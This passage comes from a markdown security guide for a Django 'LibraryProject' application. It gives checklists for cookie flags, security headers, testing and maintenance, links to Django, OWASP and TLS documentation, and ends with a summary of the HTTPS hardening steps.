### Cookie Security

- [ ] SESSION_COOKIE_SECURE = True
- [ ] SESSION_COOKIE_HTTPONLY = True
- [ ] SESSION_COOKIE_SAMESITE = 'Strict'
- [ ] CSRF_COOKIE_SECURE = True
- [ ] CSRF_COOKIE_HTTPONLY = True

### Security Headers

- [ ] X_FRAME_OPTIONS = 'DENY'
- [ ] SECURE_CONTENT_TYPE_NOSNIFF = True
- [ ] SECURE_BROWSER_XSS_FILTER = True
- [ ] CSP headers configured
- [ ] Nginx add_header directives configured

### Testing & Monitoring

- [ ] SSL Labs test (A or A+ grade)
- [ ] securityheaders.com test (A or A+ grade)
- [ ] Django `check --deploy` passes
- [ ] HTTPS redirect working
- [ ] All tests pass
- [ ] Error logging configured
- [ ] Backup system in place

### Ongoing Maintenance

- [ ] Monitor SSL certificate expiration
- [ ] Keep Django updated
- [ ] Monitor security advisories
- [ ] Regular security audits
- [ ] Log file monitoring
- [ ] Backup verification

---

## References

### Django Security Documentation
- [Django Security Documentation](https://docs.djangoproject.com/en/4.2/topics/security/)
- [Django Deployment Checklist](https://docs.djangoproject.com/en/4.2/howto/deployment/checklist/)

### Web Security Standards
- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [Mozilla Web Security](https://infosec.mozilla.org/)

### TLS/SSL Resources
- [SSL Labs Best Practices](https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices)
- [Let's Encrypt Documentation](https://letsencrypt.org/docs/)
- [HSTS Preload List](https://hstspreload.org/)

### Tools & Testing
- [SSL Labs SSL Test](https://www.ssllabs.com/ssltest/)
- [Security Headers Test](https://securityheaders.com)
- [Mozilla Observatory](https://observatory.mozilla.org)
- [Certbot Documentation](https://certbot.eff.org/)

---

## Summary

All HTTPS and security settings have been comprehensively implemented in the LibraryProject Django application:

### ✅ Step 1: HTTPS Configuration
- SECURE_SSL_REDIRECT configured
- HSTS headers properly set
- All subdomains included in HSTS
- HSTS preload enabled for browser preload lists

### ✅ Step 2: Secure Cookies
- Session cookies encrypted and secured
- CSRF cookies protected from JavaScript access
- SameSite attribute prevents cross-site requests
- All cookies marked as Secure and HttpOnly

### ✅ Step 3: Security Headers
- Clickjacking protection (X-Frame-Options)
- MIME type sniffing prevention
- XSS filter enabled
- Content Security Policy configured

### ✅ Step 4: Deployment Configuration
- Complete Nginx SSL configuration provided
- Gunicorn setup instructions included
- Environment variable configuration documented
- Let's Encrypt certificate automation explained

### ✅ Step 5: Security Review
- Comprehensive security control matrix provided
- Testing procedures documented
- Production checklist created
- Improvement areas identified

The application is now production-ready for secure HTTPS deployment. Follow the deployment configuration section and production checklist for proper installation.
